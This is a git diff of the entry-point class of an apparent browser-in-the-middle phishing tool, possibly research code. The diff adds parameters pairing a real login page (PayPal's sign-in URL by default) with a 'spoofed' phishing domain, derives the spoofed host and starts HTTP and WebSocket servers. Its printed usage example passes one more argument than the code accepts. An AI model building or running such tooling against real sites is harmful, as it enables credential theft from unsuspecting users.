@@ -22,8 +22,13 @@ public class Main {
 	private static boolean _FEATURE_DEBUG_OUTPUT = true;
 	private static boolean _FEATURE_ENABLE_ADBLOCK = true;
 	private static boolean _FEATURE_HEADLESS = false;
-	private static String _PARAM_DEFAULT_BASE_URL = "https://www.google.com/";
+//	private static String _PARAM_DEFAULT_BASE_URL = "https://www.softconf.com/utdn/qrs2021-Regular-Paper/";
+	private static String _PARAM_ORIGINAL_URL = "https://www.paypal.com/ch/signin";
+	private static String _PARAM_SPOOFED_URL = "https://www.myphishingsite.com";
+	private static String _PARAM_SPOOFED_HOST;
+	private static boolean _FEATURE_HTTPS;
 	private static Configuration _configuration;
+	
 
 	public static void main(String[] args) {
 		//TODO: tab support
@@ -32,11 +37,12 @@ public class Main {
 		//TODO: browser height bug fix
 		//TODO: textbox alignment bug fix
 		//TODO: forward / backward key support
-		if (args.length == 4) {
+		if (args.length == 5) {
 			_FEATURE_HEADLESS = Boolean.parseBoolean(args[0]);
 			_FEATURE_ENABLE_ADBLOCK = Boolean.parseBoolean(args[1]);
 			_FEATURE_DEBUG_OUTPUT = Boolean.parseBoolean(args[2]);
-			_PARAM_DEFAULT_BASE_URL = args[3];
+			_PARAM_ORIGINAL_URL = args[3];
+			_PARAM_SPOOFED_URL = args[4];
 		}
 		
 		initLogger();
@@ -45,20 +51,46 @@ public class Main {
 		 _LOG = LoggerFactory.getLogger(Main.class);
 		SeleniumLog.initWorkerThread();		
 		
-		if (args.length != 4) {
-			_LOG.warn("Wrong argument count. Note: URL needs http/https protocol prefix.");
+		if (args.length != 5) {
+			_LOG.warn("Wrong argument count. Note: URLs must contain a http/https protocol prefix.");
 			_LOG.warn("Using default configuration. See examples below.");
-			_LOG.warn("java -jar PhD.jar [headless] [adblock] [debug output] [landing page URL]");
-			_LOG.warn("java -jar PhD.jar true true false \"https://www.google.com\"");
+			_LOG.warn("java -jar PhD.jar [headless] [adblock] [debug output] [URL of original site] [URL of spoofed site]");
+			_LOG.warn("java -jar PhD.jar true true false \"https://www.google.com\" true https://www.myphishingsite.com");
+		}
+		
+		if (!_PARAM_ORIGINAL_URL.contains("/") || !_PARAM_SPOOFED_URL.contains("/")) {
+			_LOG.warn("Invalid base URL or host. Note: URLs must contain forward slashes.");
+			_LOG.warn("Using default configuration. See examples below.");
+			_LOG.warn("java -jar PhD.jar [headless] [adblock] [debug output] [URL of original site] [URL of spoofed site]");
+			_LOG.warn("java -jar PhD.jar true true false \"https://www.google.com\" true https://www.myphishingsite.com");
+		}
+		
+		if (_PARAM_SPOOFED_URL.toLowerCase().startsWith("https")) {
+			_FEATURE_HTTPS = true;
+		} else {
+			_FEATURE_HTTPS = false;
+		}
+		
+		if (_PARAM_ORIGINAL_URL.charAt(_PARAM_ORIGINAL_URL.length() - 1) == '/') {
+			_PARAM_ORIGINAL_URL = _PARAM_ORIGINAL_URL.substring(0, _PARAM_ORIGINAL_URL.indexOf("/", _PARAM_ORIGINAL_URL.indexOf("//") + 2));
+		}
+		
+		if (_PARAM_SPOOFED_URL.charAt(_PARAM_SPOOFED_URL.length() - 1) == '/') {
+			_PARAM_SPOOFED_URL = _PARAM_SPOOFED_URL.substring(0, _PARAM_SPOOFED_URL.indexOf("/", _PARAM_SPOOFED_URL.indexOf("//") + 2));
+		}
+		
+		_PARAM_SPOOFED_HOST = _PARAM_SPOOFED_URL.substring(_PARAM_SPOOFED_URL.indexOf("//") + 2);
+		if (_PARAM_SPOOFED_HOST.contains("/")) {
+			_PARAM_SPOOFED_HOST = _PARAM_SPOOFED_HOST.substring(0, _PARAM_SPOOFED_HOST.indexOf("/"));
 		}
 		
 		printCurrentConfiguration();
 		FileUtil.collectSystemInfo();
 		FileUtil.prepareJarTempFolder();
-		BrowserController controller = new BrowserController(_PARAM_DEFAULT_BASE_URL, _FEATURE_HEADLESS, _FEATURE_ENABLE_ADBLOCK, _FEATURE_DEBUG_OUTPUT);
+		BrowserController controller = new BrowserController(_PARAM_ORIGINAL_URL, _PARAM_SPOOFED_HOST, _FEATURE_HEADLESS, _FEATURE_ENABLE_ADBLOCK, _FEATURE_DEBUG_OUTPUT, _FEATURE_HTTPS);
 		
-		ServerHttp.start();
-		ServerWebSocket.start(controller);
+		ServerHttp.start(_FEATURE_HTTPS);
+		ServerWebSocket.start(controller, _FEATURE_HTTPS);
 	}
 	
 	private static void printCurrentConfiguration() {
@@ -81,8 +113,20 @@ public class Main {
 			featureState.append("debug: off, ");
 		}
 		
-		featureState.append("baseUrl: " + _PARAM_DEFAULT_BASE_URL);
+
+		featureState.append("original URL: " + _PARAM_ORIGINAL_URL + ", ");
+		
+		featureState.append("spoofed URL: " + _PARAM_SPOOFED_URL);
+		
 		_LOG.warn(featureState.toString());
+		
+		_LOG.warn("[EXEC] Detected spoofed host: " + _PARAM_SPOOFED_HOST);
+		
+		if (_FEATURE_HTTPS) {
+			_LOG.warn("[EXEC] Using HTTPS since spoofed URL contains HTTPS prefix.");
+		} else {
+			_LOG.warn("[EXEC] Using HTTP since spoofed URL contains HTTP prefix.");
+		} 
 	}
 
 	private static void initLogger() {
